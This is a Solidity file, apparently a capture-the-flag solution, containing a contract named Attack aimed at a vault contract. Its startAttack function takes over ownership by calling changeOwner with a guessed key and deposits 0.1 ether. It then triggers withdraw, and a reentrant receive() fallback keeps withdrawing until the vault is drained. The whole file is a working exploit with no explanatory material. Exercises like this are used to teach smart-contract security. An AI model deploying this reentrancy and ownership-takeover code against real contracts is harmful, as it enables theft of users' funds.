// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function changeOwner(bytes32 _key, address _newOwner) external;
    function deposite() external payable;
    function openWithdraw() external;
    function withdraw() external;
}

contract Attack {
    address public vaultAddr;

    constructor(address _vaultAddr) {
        vaultAddr = _vaultAddr;
    }

    receive() external payable {
        if (vaultAddr.balance >= 0.1 ether) {
            IVault(vaultAddr).withdraw();
        }
    }    

    function startAttack() public {
        // change owner
        (bool success, bytes memory data) = vaultAddr.call(abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32("0x1234"), address(this)));

        // deposit 0.1 ether
        IVault(vaultAddr).deposite{value: 0.1 ether}();

        // open withdraw
        IVault(vaultAddr).openWithdraw();

        // withdraw Re-Entrancy Attack
        IVault(vaultAddr).withdraw();
    }
}
